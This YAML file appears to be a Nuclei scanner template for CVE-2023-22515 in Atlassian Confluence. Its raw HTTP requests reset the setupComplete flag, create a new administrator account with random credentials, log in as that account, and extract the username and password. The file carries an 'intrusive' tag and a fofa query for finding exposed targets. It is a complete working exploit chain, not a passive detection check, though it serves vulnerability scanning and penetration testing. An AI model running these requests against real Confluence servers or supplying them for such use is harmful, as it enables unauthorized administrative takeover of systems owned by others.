http:
- extractors:
  - dsl:
    - '"USER: "+ username'
    - '"PASS: "+ password'
    type: dsl
  matchers:
  - condition: and
    dsl:
    - contains(body_1, 'Setup is already complete')
    - contains(body_3, 'Please configure the system administrator account for this
      Confluence installation')
    - contains(location_5, '/index.action')
    - status_code_5 == 302
    - contains(body_6, 'Administration')
    type: dsl
  raw:
  - 'GET /setup/setupadministrator-start.action HTTP/1.1

    Host: {{Hostname}}

    '
  - 'GET /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=0&cache{{randstr}}
    HTTP/1.1

    Host: {{Hostname}}

    '
  - 'GET /setup/setupadministrator-start.action HTTP/1.1

    Host: {{Hostname}}

    '
  - '@timeout:20s

    POST /setup/setupadministrator.action HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    X-Atlassian-Token: no-check


    username={{to_lower(username)}}&fullName=admin&email={{email}}.com&password={{password}}&confirm={{password}}&setup-next-button=Next

    '
  - 'POST /dologin.action HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    X-Atlassian-Token: no-check


    os_username={{to_lower(username)}}&os_password={{password}}&login=Log+in&os_destination=%2Findex.action

    '
  - 'GET /welcome.action HTTP/1.1

    Host: {{Hostname}}

    '
  redirects: true
id: CVE-2023-22515
info:
  author: s1r1us,iamnoooob,rootxharsh,pdresearch
  classification:
    cpe: cpe:2.3:a:atlassian:confluence_data_center:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-22515
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    epss-percentile: 0.99291
    epss-score: 0.95682
  description: 'Atlassian Confluence Data Center and Server contains a broken access
    control vulnerability that allows an attacker to create unauthorized Confluence
    administrator accounts and access Confluence.

    '
  metadata:
    fofa-query: app="ATLASSIAN-Confluence"
    max-request: 6
    product: confluence_data_center
    vendor: atlassian
    verified: true
  name: Atlassian Confluence - Privilege Escalation
  reference:
  - https://attackerkb.com/topics/Q5f0ItSzw5/cve-2023-22515/rapid7-analysis
  - https://confluence.atlassian.com/security/cve-2023-22515-privilege-escalation-vulnerability-in-confluence-data-center-and-server-1295682276.html
  - https://confluence.atlassian.com/kb/faq-for-cve-2023-22515-1295682188.html
  - https://jira.atlassian.com/browse/CONFSERVER-92475
  - https://www.cisa.gov/news-events/alerts/2023/10/05/cisa-adds-three-known-exploited-vulnerabilities-catalog
  remediation: 'Update to the latest version of Confluence

    '
  severity: critical
  tags: cve2023,cve,confluence,auth-bypass,kev,intrusive,atlassian
variables:
  email: '{{username}}@{{password}}'
  password: '{{rand_base(10)}}'
  username: '{{rand_base(10)}}'
